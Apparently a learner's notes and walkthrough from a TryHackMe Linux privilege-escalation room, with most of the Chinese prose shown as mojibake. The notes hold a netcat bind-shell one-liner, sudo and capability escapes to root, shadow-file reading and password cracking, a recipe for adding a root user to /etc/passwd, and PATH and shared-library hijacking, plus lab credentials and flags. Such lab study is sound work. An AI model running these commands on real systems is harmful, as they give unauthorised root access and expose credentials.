ç”±äºè¿™å‡ ç« å®éªŒå†…å®¹æ¯”è¾ƒå¤šï¼Œå°±ä¸åœ¨è¿™å±•ç¤ºäº†

# Shell and Web Shell

###### mkfifo /tmp/f; nc -lvnp {PORT} < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

###### ncçš„è¾“å‡ºä¸º/bin/bashçš„è¾“å…¥ï¼Œ/bin/bashçš„è¾“å‡ºå†™å…¥ç®¡é“/tmp/fï¼Œ/tmp/fä¸ºncçš„è¾“å…¥.

æ¯”è¾ƒç®€å•, ä¸»è¦æ˜¯netcatå’Œmatesploitçš„ä½¿ç”¨

ä¸ç”¨msfvenomç”Ÿæˆshellcode payloadä¹Ÿå¯ä»¥çœ‹åœ¨çº¿ç½‘ç«™ï¼šhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

åŒ…å«äº†éå¸¸å¤šçš„reverse shell payload

# Linux æƒé™æå‡

ç”±äºä¸œè¥¿å¤ªå¤šï¼Œåªè®°å½•ç‚¹é‡è¦çš„

    uname -a ä¿¡æ¯æ”¶é›†
    /proc/version ä¿¡æ¯æ”¶é›†
    ps -aux è¿›ç¨‹è¡¨
    env ç¯å¢ƒå˜é‡
    sudo -l æŸ¥çœ‹èƒ½sudoçš„å‘½ä»¤
    find
    find ... 2>/dev/null å°†é”™è¯¯ä¸¢åƒåœ¾æ¡¶ï¼Œå…¶ä»–å‘½ä»¤é€‚ç”¨


### å†…æ ¸æ¼æ´åˆ©ç”¨

é€šè¿‡ä¿¡æ¯æ”¶é›†çš„ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬ï¼Œå¯»æ‰¾å­˜åœ¨çš„æ¼æ´

åœ¨çº¿ç½‘ç«™: https://www.linuxkernelcves.com/

ä½¿ç”¨å¯ç”¨expæˆ–è€…matesploitåˆ©ç”¨

### sudo -l

sudoå…è®¸æˆ‘ä»¬ä»¥æ¯”å½“å‰ç”¨æˆ·æ›´é«˜çš„æƒé™è¿è¡ŒæŸä¸ªå‘½ä»¤

å¦‚æœsudoè¿è¡Œå½“å‰ç”¨æˆ·è¿è¡Œå¦‚ï¼šfindã€lessã€base64....ç­‰ç­‰

åˆ™å¯ä»¥å°è¯•ææƒï¼š

    sudo find . -exec /bin/bash \;  -exec æ‰§è¡Œå‘½ä»¤

.

    sudo less /etc/passwd å›è½¦
    !/bin/bash å›è½¦

.

    base64ç”¨äºè¯»å–æƒé™é«˜çš„æ–‡ä»¶

# https://gtfobins.github.io/ å‘½ä»¤åˆ—è¡¨


### SUID

æ–‡ä»¶å¯ä»¥å…·æœ‰è¯»å–ã€å†™å…¥å’Œæ‰§è¡Œæƒé™ã€‚è¿™äº›æƒé™æˆäºˆç”¨æˆ·çš„æƒé™çº§åˆ«ã€‚è¿™éšç€ SUIDï¼ˆè®¾ç½®ç”¨æˆ·æ ‡è¯†ï¼‰å’Œ SGIDï¼ˆè®¾ç½®ç»„æ ‡è¯†ï¼‰è€Œæ›´æ”¹ã€‚å®ƒä»¬å…è®¸åˆ†åˆ«ä»¥æ–‡ä»¶æ‰€æœ‰è€…æˆ–ç»„æ‰€æœ‰è€…çš„æƒé™çº§åˆ«æ‰§è¡Œæ–‡ä»¶ã€‚

    find / -type f -perm -04000 2>/dev/null    æŸ¥çœ‹è®¾æœ‰suidçš„æ–‡ä»¶

/etc/shadowéœ€è¦rootæ‰èƒ½è¯»å†™, å¯ä»¥æƒ³åŠæ³•åˆ©ç”¨sudoæˆ–å…·æœ‰suidçš„æ–‡ä»¶è¯»å†™å‘½ä»¤å°è¯•è¯»å–ï¼Œå¦‚base64

åˆ©ç”¨unshadowé…åˆjohnå¯ä»¥å°è¯•çˆ†ç ´ç”¨æˆ·å¯†ç :

    unshadow </etc/passwd> </etc/shadow> > <OutFileName>

å°†ä¸Šè¿°è¾“å‡ºçš„æ–‡ä»¶åˆ©ç”¨johnæš´åŠ›ç ´è§£

    john --wordlist <æ¯”å¦‚rockyou.txt> <ä¸Šè¿°è¾“å‡ºçš„æ–‡ä»¶å>


æ­¤å¤–ï¼Œå¦‚æœæœ‰æƒé™ï¼Œè¿˜å¯ä»¥ç›´æ¥å‘/etc/passwd/æ·»åŠ rootæƒé™çš„ç”¨æˆ·

ä½¿ç”¨opensslåˆ›å»ºåŠ ç›hashå¯†ç :

    openssl passwd -1 -salt h4ck <password>

ç„¶åå°†ç»“æœæ’å…¥ï¼š

    <username>:<ä¸Šè¿°ç»“æœ>:0:0:root:/root:/bin/bash

    å°†è¯¥æ¡ä¿¡æ¯è¿½åŠ è¿›/etc/passwd


### Capabilities

ç³»ç»Ÿç®¡ç†å‘˜å¯ç”¨äºæé«˜è¿›ç¨‹æˆ–äºŒè¿›åˆ¶æ–‡ä»¶æƒé™çº§åˆ«çš„å¦ä¸€ç§æ–¹æ³•æ˜¯â€œCapabilitiesâ€. Capabilities å¸®åŠ©åœ¨æ›´ç²¾ç»†çš„çº§åˆ«ç®¡ç†æƒé™ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ SOC åˆ†æå¸ˆéœ€è¦ä½¿ç”¨éœ€è¦å¯åŠ¨å¥—æ¥å­—è¿æ¥çš„å·¥å…·ï¼Œåˆ™æ™®é€šç”¨æˆ·å°†æ— æ³•æ‰§è¡Œæ­¤æ“ä½œã€‚å¦‚æœç³»ç»Ÿç®¡ç†å‘˜ä¸æƒ³æˆäºˆæ­¤ç”¨æˆ·æ›´é«˜çš„æƒé™ï¼Œä»–ä»¬å¯ä»¥æ›´æ”¹Capabilitiesçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å› æ­¤ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶å°†åœ¨ä¸éœ€è¦æ›´é«˜æƒé™ç”¨æˆ·çš„æƒ…å†µä¸‹å®Œæˆå…¶ä»»åŠ¡

    getcap -r / 2>/dev/null

ä¾‹å¦‚å¦‚æœvimåœ¨capé‡Œé¢ï¼Œåˆ™å¯ä»¥å°è¯•ææƒï¼š

    ./vim -c ':py3 import os;os.setuid(0);os.execl("/bin/sh","sh","-c","reset; exec sh")'

æ³¨æ„ç¨‹åºè·¯å¾„ï¼

<pre>karen@ip-10-10-141-89:~$ pwd
/home/karen
karen@ip-10-10-141-89:~$ getcap -r / 2&gt;/dev/null |grep vim
/home/karen/vim = cap_setuid+ep
karen@ip-10-10-141-89:~$ 
</pre>


### Cron Jobs

Cron ä½œä¸šç”¨äºåœ¨ç‰¹å®šæ—¶é—´è¿è¡Œè„šæœ¬æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä»¬ä»¥å…¶æ‰€æœ‰è€…è€Œä¸æ˜¯å½“å‰ç”¨æˆ·çš„æƒé™è¿è¡Œã€‚è™½ç„¶æ­£ç¡®é…ç½®çš„ cron ä½œä¸šæœ¬èº«å¹¶ä¸å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹å®ƒä»¬å¯ä»¥æä¾›æƒé™å‡çº§å‘é‡ã€‚
è¿™ä¸ªæƒ³æ³•å¾ˆç®€å•;å¦‚æœæœ‰ä¸€ä¸ªä»¥ root æƒé™è¿è¡Œçš„è®¡åˆ’ä»»åŠ¡ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥æ›´æ”¹å°†è¦è¿è¡Œçš„è„šæœ¬ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„è„šæœ¬å°†ä»¥ root æƒé™è¿è¡Œã€‚

Cron ä½œä¸šé…ç½®å­˜å‚¨ä¸º crontabsï¼ˆcron è¡¨ï¼‰ï¼Œä»¥æŸ¥çœ‹ä»»åŠ¡ä¸‹æ¬¡è¿è¡Œçš„æ—¶é—´å’Œæ—¥æœŸã€‚

ç³»ç»Ÿä¸Šçš„æ¯ä¸ªç”¨æˆ·éƒ½æœ‰è‡ªå·±çš„ crontab æ–‡ä»¶ï¼Œæ— è®ºä»–ä»¬æ˜¯å¦ç™»å½•ï¼Œéƒ½å¯ä»¥è¿è¡Œç‰¹å®šä»»åŠ¡ã€‚å¦‚æ‚¨æ‰€æ–™ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‰¾åˆ°ä¸€ä¸ªç”± root è®¾ç½®çš„ cron ä½œä¸šï¼Œå¹¶è®©å®ƒè¿è¡Œæˆ‘ä»¬çš„è„šæœ¬ï¼Œæœ€å¥½æ˜¯ shellã€‚

CTF æœºå™¨å¯ä»¥æ¯åˆ†é’Ÿæˆ–æ¯ 5 åˆ†é’Ÿè¿è¡Œä¸€æ¬¡ cron ä½œä¸šï¼Œä½†æ‚¨æ›´ç»å¸¸ä¼šåœ¨æ¸—é€æµ‹è¯•æ´»åŠ¨ä¸­çœ‹åˆ°æ¯å¤©ã€æ¯å‘¨æˆ–æ¯æœˆè¿è¡Œçš„ä»»åŠ¡ã€‚

    /etc/crontab


å¯ä»¥å°è¯•ä¿®æ”¹å…·æœ‰é«˜æƒé™çš„çš„crontabè¿è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œå¯ä»¥æ”¹æˆreverse shellï¼Œæˆ‘ä»¬è¿™è¾¹å°±å¯ä»¥ç›‘å¬,getshell

Crontab æ€»æ˜¯å€¼å¾—æ£€æŸ¥çš„ï¼Œå› ä¸ºå®ƒæœ‰æ—¶ä¼šå¯¼è‡´ç®€å•çš„æƒé™å‡çº§å‘é‡ã€‚ä»¥ä¸‹æƒ…å†µåœ¨æ²¡æœ‰ç‰¹å®šç½‘ç»œå®‰å…¨æˆç†Ÿåº¦çº§åˆ«çš„å…¬å¸ä¸­å¹¶ä¸å°‘è§ï¼š

    ç³»ç»Ÿç®¡ç†å‘˜éœ€è¦å®šæœŸè¿è¡Œè„šæœ¬ã€‚

    ä»–ä»¬åˆ›å»ºä¸€ä¸ª cron ä½œä¸šæ¥æ‰§è¡Œæ­¤æ“ä½œ

    ä¸€æ®µæ—¶é—´åï¼Œè„šæœ¬å˜å¾—æ— ç”¨ï¼Œä»–ä»¬å°†å…¶åˆ é™¤

    ä»–ä»¬ä¸æ¸…ç†ç›¸å…³çš„ cron ä½œä¸š

    æ­¤æ›´æ”¹ç®¡ç†é—®é¢˜ä¼šå¯¼è‡´åˆ©ç”¨ cron ä½œä¸šçš„æ½œåœ¨æ¼æ´åˆ©ç”¨ã€‚

å¦‚æœcrontabä¸­ä»»åŠ¡è¿˜å­˜åœ¨ï¼Œä½†æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶å·²ç»ä¸å­˜åœ¨äº†ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åœ¨crontabä¸­æŒ‡å®šçš„ç›®å½•åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„è„šæœ¬æ–‡ä»¶ å¦‚ åå‘shellï¼Œè¿™æ ·æˆ‘ä»¬çš„è„šæœ¬å°†ä¼šè¢«å®šæ—¶è¿è¡Œ


### PATHç¯å¢ƒå˜é‡

è¯´ç™½äº†å°±æ˜¯åˆ©ç”¨$PATHä¸­çš„ å¯å†™å…¥æ–‡ä»¶å¤¹ï¼Œé€šè¿‡å°†æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ›¿æ¢ä¸ºæˆ‘ä»¬çš„æ¶æ„è„šæœ¬ï¼Œå½“è¢«æ‹¥æœ‰é«˜æƒé™çš„åº”ç”¨ç¨‹åº(SUIDã€sudoã€capabilities)æˆ–ç”¨æˆ·æ‰§è¡Œï¼Œå°±ä¼šä»¥è¯¥æƒé™æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„è„šæœ¬

    æŸ¥æ‰¾å¯å†™æ–‡ä»¶å¤¹ï¼Œç„¶åçœ‹çœ‹$PATHä¸­æœ‰æ²¡æœ‰
    find / -writable 2>/dev/null

æˆ–è€…æŸ¥æ‰¾ä»»æ„æˆ‘ä»¬å½“å‰ç”¨æˆ·å¯å†™æ–‡ä»¶å¤¹ï¼Œå¹¶å°è¯•å°†æ–‡ä»¶å¤¹æ·»åŠ è‡³ç¯å¢ƒå˜é‡

    export PATH=<path>:$PATH

### NFS

æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯åº”è¯¥ä¼šæ¯”è¾ƒå°‘è§

# linuxææƒ æœ€ç»ˆæŒ‘æˆ˜

åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæ‚¨å¯¹ Linux ä¸Šçš„ä¸»è¦æƒé™å‡çº§å‘é‡æœ‰äº†ç›¸å½“å¥½çš„äº†è§£ï¼Œè¿™ä¸ªæŒ‘æˆ˜åº”è¯¥ç›¸å½“å®¹æ˜“ã€‚

æ‚¨å·²ç»è·å¾—äº†å¯¹å¤§å‹ç§‘å­¦è®¾æ–½çš„SSHè®¿é—®æƒé™ã€‚å°è¯•æå‡æ‚¨çš„æƒé™ï¼Œç›´åˆ°æ‚¨æˆä¸º Rootã€‚
æˆ‘ä»¬ è®¾è®¡æ­¤æˆ¿é—´æ˜¯ä¸ºäº†å¸®åŠ©æ‚¨æ„å»ºå…¨é¢çš„ Linux æ–¹æ³•è®º æƒé™æå‡åœ¨ OSCP å’Œ OSCP ç­‰è€ƒè¯•ä¸­éå¸¸æœ‰ç”¨ æ‚¨çš„æ¸—é€æµ‹è¯•æ´»åŠ¨ã€‚

ä¸è®©ä»»ä½•ç‰¹æƒå‡çº§å‘é‡ä¸è¢«æ¢ç´¢ï¼Œç‰¹æƒå‡çº§é€šå¸¸æ›´åƒæ˜¯ä¸€é—¨è‰ºæœ¯è€Œä¸æ˜¯ä¸€é—¨ç§‘å­¦ã€‚

æ‚¨å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®ç›®æ ‡è®¡ç®—æœºæˆ–ä½¿ç”¨ä¸‹é¢çš„ SSH å‡­æ®ã€‚

ç”¨æˆ·åï¼š leonard

å¯†ç ï¼šPenny123

### flag1.txtæ–‡ä»¶çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ

    uname -a
    https://www.linuxkernelcves.com/
    æ‰¾å†…æ ¸ç›¸å…³æ¼æ´ï¼Œæ²¡æ‰¾åˆ°

sudo -lä»€ä¹ˆéƒ½æ²¡æœ‰

å°è¯•æŸ¥æ‰¾è®¾ç½®äº†suidçš„æ–‡ä»¶ï¼š

<pre>[leonard@ip-10-10-241-187 ~]$ find / -type f -perm -04000 2&gt;/dev/null
/usr/bin/base64
/usr/bin/crontab
.....
</pre>

è¯»å–/etc/passwdå’Œ/etc/shadowç„¶åä½¿ç”¨unshadowåˆå¹¶ï¼Œä½¿ç”¨johnçˆ†ç ´ï¼š

<pre><font color="#367BF0">â”€â”€(</font><font color="#EC0101"><b>rootğŸ’€kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">â””â”€</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">scp</font> leonard@10.10.241.187:/etc/passwd ./passwd
(leonard@10.10.241.187) Password: 
passwd                                        100% 2789     5.5KB/s   00:00</pre>

<pre>[leonard@ip-10-10-241-187 ~]$ base64 /etc/shadow | base64 -d
</pre>

<pre><font color="#367BF0">â”€â”€(</font><font color="#EC0101"><b>rootğŸ’€kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">â””â”€</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">unshadow</font> <u style="text-decoration-style:single">./passwd</u> <u style="text-decoration-style:single">./shadow</u> <font color="#277FFF"><b>&gt;</b></font> p_s.txt
Created directory: /root/.john
                                                                                
<font color="#367BF0">â”Œâ”€â”€(</font><font color="#EC0101"><b>rootğŸ’€kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">â””â”€</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">john</font> <font color="#9755B3">--wordlist=/usr/share/wordlists/rockyou.txt</font> <u style="text-decoration-style:single">./p_s.txt</u>
</pre>

ç»“æœ:

<pre><font color="#FEA44C">Password1</font>        (<font color="#FEA44C">missy</font>) </pre>

ç™»å½•sshï¼ŒæŸ¥æ‰¾flag1å¹¶å°è¯•è¯»å–:

<pre>[missy@ip-10-10-241-187 ~]$ find -name flag1.txt 2&gt;/dev/null
./Documents/flag1.txt
[missy@ip-10-10-241-187 ~]$ cat ./Documents/flag1.txt
THM-42828719920544
</pre>

THM-42828719920544

### flag2.txtæ–‡ä»¶çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ

åœ¨missyè´¦å·ä¸ŠæŸ¥çœ‹sudo -l ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨find,å¯ä»¥å°è¯•ææƒ

<pre>[missy@ip-10-10-241-187 ~]$ sudo find . -exec /bin/bash \;
[root@ip-10-10-241-187 missy]# locate flag2.txt
/home/rootflag/flag2.txt
[root@ip-10-10-241-187 missy]# cat /home/rootflag/flag2.txt
THM-168824782390238
</pre>


### è¡¥å……ï¼š

/usr/local/bin/suid-soè¢«è®¾suid

é€šè¿‡strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access"
æŸ¥çœ‹è¢«åŠ è½½çš„soæ–‡ä»¶

é€šè¿‡gccç¼–è¯‘æ¶æ„cæ–‡ä»¶ä¸ºsoæ–‡ä»¶

    gcc -shared -fPIC -o {.so file} {.c file}

è¦†ç›–è¢«suid-soåŠ è½½çš„æ–‡ä»¶

å†æ¬¡è¿è¡Œsuid-so


############################################################

/usr/local/bin/suid-env å¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥è¢«åˆ©ç”¨ï¼Œå› ä¸ºå®ƒç»§æ‰¿äº†ç”¨æˆ·çš„ PATH ç¯å¢ƒå˜é‡å¹¶å°è¯•åœ¨ä¸æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹æ‰§è¡Œç¨‹åºã€‚

é¦–å…ˆï¼Œæ‰§è¡Œè¯¥æ–‡ä»¶å¹¶æ³¨æ„å®ƒä¼¼ä¹æ­£åœ¨å°è¯•å¯åŠ¨ apache2 ç½‘ç»œæœåŠ¡å™¨ï¼š

    /usr/local/bin/suid-env

åœ¨æ–‡ä»¶ä¸Šè¿è¡Œå­—ç¬¦ä¸²ä»¥æŸ¥æ‰¾å¯æ‰“å°å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼š

    strings /usr/local/bin/suid-env

ä¸€è¡Œï¼ˆâ€œservice apache2 startâ€ï¼‰è¡¨ç¤ºæ­£åœ¨è°ƒç”¨æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶æ¥å¯åŠ¨ Web æœåŠ¡å™¨ï¼Œä½†æ˜¯æœªä½¿ç”¨å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ ï¼ˆ/usr/sbin/serviceï¼‰ã€‚

    gcc -o service /home/user/tools/suid/service.c

å°†å½“å‰ç›®å½•ï¼ˆæˆ–æ–°æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶æ‰€åœ¨çš„ä½ç½®ï¼‰é™„åŠ åˆ° PATH å˜é‡ï¼Œå¹¶è¿è¡Œ suid-env å¯æ‰§è¡Œæ–‡ä»¶ä»¥è·å–æ ¹ shellï¼š

    export PATH=.:$PATH


### https://tryhackme.com/room/linuxprivesc
